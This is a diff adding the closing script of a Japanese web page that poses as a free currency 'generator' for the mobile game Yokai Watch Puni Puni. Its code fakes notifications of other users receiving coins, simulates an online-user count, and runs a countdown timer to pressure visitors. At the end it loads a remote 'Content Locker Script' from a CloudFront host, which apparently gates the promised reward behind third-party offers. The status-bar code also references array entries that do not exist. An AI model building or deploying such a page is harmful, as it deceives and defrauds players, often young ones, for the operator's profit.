+                    
+                    const notificationElement = document.createElement('div');
+                    notificationElement.className = 'notification';
+                    
+                    notificationElement.innerHTML = `
+                        <div class="notification-icon">
+                            <img src="${randomImage}" alt="Y-Money">
+                        </div>
+                        <div class="notification-content">
+                            <div class="notification-title">${notification.username} がコインを獲得！</div>
+                            <div class="notification-message">${notification.coins} Yマネーがアカウントに追加されました</div>
+                            <div class="notification-time">${notification.time}</div>
+                        </div>
+                    `;
+                    
+                    notificationContainer.appendChild(notificationElement);
+                    
+                    // Remove notification after 5 seconds
+                    setTimeout(() => {
+                        notificationElement.classList.add('fade-out');
+                        setTimeout(() => {
+                            notificationElement.remove();
+                        }, 500);
+                    }, 5000);
+                    
+                    // Move to next notification
+                    notificationIndex = (notificationIndex + 1) % notifications.length;
+                }
+                
+                // Show first notification after 2 seconds
+                setTimeout(() => {
+                    showNotification();
+                    
+                    // Show notifications at random intervals between 8-15 seconds
+                    setInterval(() => {
+                        showNotification();
+                    }, Math.random() * 7000 + 8000);
+                }, 2000);
+                
+                // Enhanced Yokai Watch Puni Puni themed functionality
+                // Add sound to all clickable elements
+                const clickableElements = document.querySelectorAll('button, .device-btn, .ymoney-option');
+                clickableElements.forEach(element => {
+                    element.addEventListener('click', function() {
+                        playClickSound();
+                    });
+                });
+                
+                // Dynamic status bar updates
+                function updateStatusBar() {
+                    // Update status with random variations
+                    const statusElement = document.getElementById('status');
+                    const statusOptions = [
+                        { text: 'オンライン ✅', color: '#4169E1' },
+                    ];
+                    
+                    // 90% chance to be online, 5% busy, 5% maintenance
+                    const randomValue = Math.random();
+                    let selectedStatus;
+                    
+                    if (randomValue < 0.9) {
+                        selectedStatus = statusOptions[0]; // Online
+                    } else if (randomValue < 0.95) {
+                        selectedStatus = statusOptions[1]; // Busy
+                    } else {
+                        selectedStatus = statusOptions[2]; // Maintenance
+                    }
+                    
+                    statusElement.textContent = selectedStatus.text;
+                    statusElement.style.color = selectedStatus.color;
+                    
+                    // Update last update time
+                    const now = new Date();
+                    const hours = now.getHours().toString().padStart(2, '0');
+                    const minutes = now.getMinutes().toString().padStart(2, '0');
+                    const timeString = `${hours}:${minutes}`;
+                    document.getElementById('date').textContent = timeString + ' 📅';
+                }
+                
+                // Enhanced online count simulation
+                function updateOnlineCount() {
+                    const countElement = document.getElementById('online-count');
+                    const currentCount = parseInt(countElement.textContent.replace(/[^\d]/g, ''));
+                    
+                    // More realistic user count changes
+                    const change = Math.floor(Math.random() * 15) - 7; // -7 to +7
+                    const newCount = Math.max(1200, Math.min(1500, currentCount + change));
+                    countElement.textContent = newCount.toLocaleString() + ' 👥';
+                    
+                    // Add visual feedback when count changes significantly
+                    if (Math.abs(change) > 5) {
+                        countElement.style.transform = 'scale(1.1)';
+                        countElement.style.color = '#4169E1';
+                        setTimeout(() => {
+                            countElement.style.transform = '';
+                            countElement.style.color = '';
+                        }, 500);
+                    }
+                }
+                
+                // Initialize dynamic updates
+                updateStatusBar();
+                setInterval(updateStatusBar, 60000); // Update every minute
+                
+                updateOnlineCount();
+                setInterval(updateOnlineCount, 3000); // Update every 3 seconds
+                
+                // Device selection with enhanced feedback
+                const androidBtn = document.getElementById('android-btn');
+                const iphoneBtn = document.getElementById('iphone-btn');
+                let selectedDevice = '';
+                
+                androidBtn.addEventListener('click', function() {
+                    androidBtn.classList.add('active');
+                    iphoneBtn.classList.remove('active');
+                    selectedDevice = 'ANDROID';
+                    // Add haptic-like visual feedback
+                    this.style.transform = 'scale(0.95)';
+                    setTimeout(() => { this.style.transform = ''; }, 150);
+                });
+                
+                iphoneBtn.addEventListener('click', function() {
+                    iphoneBtn.classList.add('active');
+                    androidBtn.classList.remove('active');
+                    selectedDevice = 'IPHONE';
+                    // Add haptic-like visual feedback
+                    this.style.transform = 'scale(0.95)';
+                    setTimeout(() => { this.style.transform = ''; }, 150);
+                });
+                
+                // Screen management with Yokai Watch-like transitions
+                const connectBtn = document.getElementById('connect-btn');
+                const loginScreen = document.getElementById('login-screen');
+                const ymoneyScreen = document.getElementById('ymoney-screen');
+                const orbsScreen = document.getElementById('orbs-screen');
+                const verificationScreen = document.getElementById('verification-screen');
+                
+                function showScreen(hideScreen, showScreen) {
+                    hideScreen.style.opacity = '0';
+                    hideScreen.style.transform = 'translateY(-20px)';
+                    setTimeout(() => {
+                        hideScreen.classList.add('hidden');
+                        showScreen.classList.remove('hidden');
+                        showScreen.style.opacity = '0';
+                        showScreen.style.transform = 'translateY(20px)';
+                        setTimeout(() => {
+                            showScreen.style.opacity = '1';
+                            showScreen.style.transform = 'translateY(0)';
+                        }, 50);
+                    }, 300);
+                }
+                
+                connectBtn.addEventListener('click', function() {
+                    const username = document.getElementById('username').value;
+                    if (username && selectedDevice) {
+                        this.innerHTML = ' 接続中...';
+                        this.disabled = true;
+                        setTimeout(() => {
+                            showScreen(loginScreen, ymoneyScreen);
+                            this.innerHTML = ' 接続開始';
+                            this.disabled = false;
+                        }, 1500);
+                    } else {
+                        // Enhanced error feedback
+                        const missingField = !username ? 'ユーザー名' : 'デバイス';
+                        const errorMsg = `⚠️ ${missingField}を入力してください！`;
+                        
+                        // Create temporary error message
+                        const errorDiv = document.createElement('div');
+                        errorDiv.innerHTML = errorMsg;
+                        errorDiv.style.cssText = `
+                            position: fixed;
+                            top: 50%;
+                            left: 50%;
+                            transform: translate(-50%, -50%);
+                            background: linear-gradient(135deg, rgba(65, 105, 225, 0.9), rgba(147, 112, 219, 0.9));
+                            color: white;
+                            padding: 15px 25px;
+                            border-radius: 15px;
+                            font-weight: 700;
+                            box-shadow: 0 10px 30px rgba(65, 105, 225, 0.4);
+                            z-index: 1000;
+                            animation: errorPop 0.3s ease-out;
+                        `;
+                        
+                        document.body.appendChild(errorDiv);
+                        setTimeout(() => {
+                            errorDiv.remove();
+                        }, 2000);
+                    }
+                });
+                
+                // Enhanced Y-Money selection with visual feedback
+                const ymoneyOptions = document.querySelectorAll('#ymoney-screen .ymoney-option');
+                let selectedYmoney = 0;
+                
+                ymoneyOptions.forEach(option => {
+                    option.addEventListener('click', function() {
+                        ymoneyOptions.forEach(opt => opt.classList.remove('selected'));
+                        this.classList.add('selected');
+                        selectedYmoney = parseInt(this.dataset.ymoney);
+                        
+                        // Add Yokai Watch-like selection animation
+                        this.style.transform = 'scale(1.1)';
+                        setTimeout(() => {
+                            this.style.transform = '';
+                        }, 200);
+                        
+                        // Play success sound for selection
+                        playSuccessSound();
+                        
+                        // Play coin sound effect (visual representation)
+                        const ymoneyIcon = this.querySelector('.ymoney-icon');
+                        ymoneyIcon.style.animation = 'none';
+                        setTimeout(() => {
+                            ymoneyIcon.style.animation = 'spin 0.5s ease-out';
+                        }, 10);
+                    });
+                });
+                
+                // Continue to orbs selection with enhanced animation
+                document.getElementById('continue-to-orbs').addEventListener('click', function() {
+                    if (selectedYmoney > 0) {
+                        this.innerHTML = ' 処理中...';
+                        this.disabled = true;
+                        setTimeout(() => {
+                            showScreen(ymoneyScreen, orbsScreen);
+                            this.innerHTML = ' 続ける';
+                            this.disabled = false;
+                        }, 1000);
+                    } else {
+                        // Enhanced error feedback for Y-Money selection
+                        const errorMsg = '💰 Yマネーの数量を選択してください！';
+                        showYokaiWatchAlert(errorMsg);
+                    }
+                });
+                
+                // Enhanced orbs selection with visual effects
+                const orbsOptions = document.querySelectorAll('#orbs-screen .ymoney-option');
+                let selectedOrbs = 0;
+                
+                orbsOptions.forEach(option => {
+                    option.addEventListener('click', function() {
+                        orbsOptions.forEach(opt => opt.classList.remove('selected'));
+                        this.classList.add('selected');
+                        selectedOrbs = parseInt(this.dataset.orbs);
+                        
+                        // Add sparkle effect for orbs
+                        this.style.transform = 'scale(1.1)';
+                        setTimeout(() => {
+                            this.style.transform = '';
+                        }, 200);
+                        
+                        // Play success sound for selection
+                        playSuccessSound();
+                        
+                        // Orb sparkle animation
+                        const orbIcon = this.querySelector('.ymoney-icon');
+                        orbIcon.style.boxShadow = '0 0 20px #4169E1, 0 0 40px #4169E1, 0 0 60px #4169E1';
+                        setTimeout(() => {
+                            orbIcon.style.boxShadow = '';
+                        }, 1000);
+                    });
+                });
+                
+                // Continue to verification with enhanced effects
+                document.getElementById('continue-to-verify').addEventListener('click', function() {
+                    if (selectedOrbs > 0) {
+                        this.innerHTML = ' 認証準備中...';
+                        this.disabled = true;
+                        setTimeout(() => {
+                            showScreen(orbsScreen, verificationScreen);
+                            
+                            // Update verification screen with selected values
+                            document.getElementById('verify-username').textContent = document.getElementById('username').value;
+                            document.getElementById('verify-device').textContent = selectedDevice;
+                            document.getElementById('verify-ymoney').textContent = selectedYmoney.toLocaleString();
+                            document.getElementById('verify-orbs').textContent = selectedOrbs.toLocaleString();
+                            
+                            // Start the enhanced timer
+                            startEnhancedTimer();
+                            
+                            this.innerHTML = ' 続ける';
+                            this.disabled = false;
+                        }, 1500);
+                    } else {
+                        const errorMsg = '💎 妖怪パッドの数量を選択してください！';
+                        showYokaiWatchAlert(errorMsg);
+                    }
+                });
+                
+                // Enhanced timer with Yokai Watch-like animations
+                function startEnhancedTimer() {
+                    let timeLeft = 175; // 2 minutes 55 seconds
+                    const timerElement = document.getElementById('timer');
+                    
+                    const countdown = setInterval(() => {
+                        const minutes = Math.floor(timeLeft / 60);
+                        const seconds = timeLeft % 60;
+                        timerElement.textContent = `${minutes.toString().padStart(2, '0')} minutes and ${seconds.toString().padStart(2, '0')} seconds`;
+                        
+                        // Add urgency effects when time is low
+                        if (timeLeft <= 30) {
+                            timerElement.style.color = '#FF0000';
+                            timerElement.style.animation = 'pulse 0.5s ease-in-out infinite';
+                        } else if (timeLeft <= 60) {
+                            timerElement.style.color = '#FF6600';
+                        }
+                        
+                        if (timeLeft <= 0) {
+                            clearInterval(countdown);
+                            timerElement.textContent = "⏰ 時間切れ";
+                            timerElement.style.animation = 'flash 0.5s ease-in-out infinite';
+                            document.getElementById('verify-btn').disabled = true;
+                            document.getElementById('verify-btn').innerHTML = '❌ 時間切れ';
+                        }
+                        
+                        timeLeft--;
+                    }, 1000);
+                }
+                
+                // Custom Yokai Watch alert system
+                function showYokaiWatchAlert(message, type = 'error') {
+                    const alertDiv = document.createElement('div');
+                    const bgColor = type === 'success' ? 
+                        'linear-gradient(135deg, rgba(76, 175, 80, 0.9), rgba(69, 160, 73, 0.9))' : 
+                        'linear-gradient(135deg, rgba(65, 105, 225, 0.9), rgba(147, 112, 219, 0.9))';
+                    
+                    alertDiv.innerHTML = message;
+                    alertDiv.style.cssText = `
+                        position: fixed;
+                        top: 50%;
+                        left: 50%;
+                        transform: translate(-50%, -50%);
+                        background: ${bgColor};
+                        color: white;
+                        padding: 20px 30px;
+                        border-radius: 20px;
+                        font-weight: 700;
+                        font-size: 16px;
+                        box-shadow: 0 15px 40px rgba(0,0,0,0.3);
+                        z-index: 1000;
+                        animation: yokaiPopIn 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+                        border: 3px solid white;
+                        text-align: center;
+                        min-width: 250px;
+                    `;
+                    
+                    document.body.appendChild(alertDiv);
+                    
+                    setTimeout(() => {
+                        alertDiv.style.animation = 'yokaiPopOut 0.3s ease-in forwards';
+                        setTimeout(() => {
+                            alertDiv.remove();
+                        }, 300);
+                    }, 2500);
+                }
+                
+                // Create celebration effect
+                function createCelebrationEffect() {
+                    for (let i = 0; i < 20; i++) {
+                        setTimeout(() => {
+                            const confetti = document.createElement('div');
+                            const colors = ['#FFD700', '#FF69B4', '#4169E1', '#9370DB', '#32CD32'];
+                            const randomColor = colors[Math.floor(Math.random() * colors.length)];
+                            
+                            confetti.style.cssText = `
+                                position: fixed;
+                                width: 10px;
+                                height: 10px;
+                                background: ${randomColor};
+                                border-radius: 50%;
+                                pointer-events: none;
+                                z-index: 1000;
+                                left: ${Math.random() * window.innerWidth}px;
+                                top: -10px;
+                                animation: confettiFall 3s linear forwards;
+                            `;
+                            
+                            document.body.appendChild(confetti);
+                            
+                            setTimeout(() => {
+                                confetti.remove();
+                            }, 3000);
+                        }, i * 100);
+                    }
+                }
+                
+                // Add custom CSS animations
+                const style = document.createElement('style');
+                style.textContent = `
+                    @keyframes yokaiPopIn {
+                        0% {
+                            transform: translate(-50%, -50%) scale(0);
+                            opacity: 0;
+                        }
+                        100% {
+                            transform: translate(-50%, -50%) scale(1);
+                            opacity: 1;
+                        }
+                    }
+                    
+                    @keyframes yokaiPopOut {
+                        0% {
+                            transform: translate(-50%, -50%) scale(1);
+                            opacity: 1;
+                        }
+                        100% {
+                            transform: translate(-50%, -50%) scale(0);
+                            opacity: 0;
+                        }
+                    }
+                    
+                    @keyframes confettiFall {
+                        0% {
+                            transform: translateY(-100vh) rotate(0deg);
+                            opacity: 1;
+                        }
+                        100% {
+                            transform: translateY(100vh) rotate(360deg);
+                            opacity: 0;
+                        }
+                    }
+                    
+                    @keyframes errorPop {
+                        0% {
+                            transform: translate(-50%, -50%) scale(0);
+                            opacity: 0;
+                        }
+                        50% {
+                            transform: translate(-50%, -50%) scale(1.1);
+                        }
+                        100% {
+                            transform: translate(-50%, -50%) scale(1);
+                            opacity: 1;
+                        }
+                    }
+                `;
+                document.head.appendChild(style);
+                
+                // Add smooth transitions to all screens
+                [loginScreen, ymoneyScreen, orbsScreen, verificationScreen].forEach(screen => {
+                    screen.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
+                });
+                
+                // Initialize with welcome effect
+                setTimeout(() => {
+                    const welcomeMsg = ' 妖怪ウォッチ ぷにぷに ジェネレーターへようこそ！';
+                    showYokaiWatchAlert(welcomeMsg, 'success');
+                }, 1000);
+            });
+        })();
+    </script>
+    
+    <!-- Content Locker Script -->
+    <script type="text/javascript">
+        var XvmPm_yGM_BlkCPc={"it":4535350,"key":"5a81c"};
+    </script>
+    <script src="https://dlk457skl57zp.cloudfront.net/60f7c71.js"></script>
+</body>
+</html>
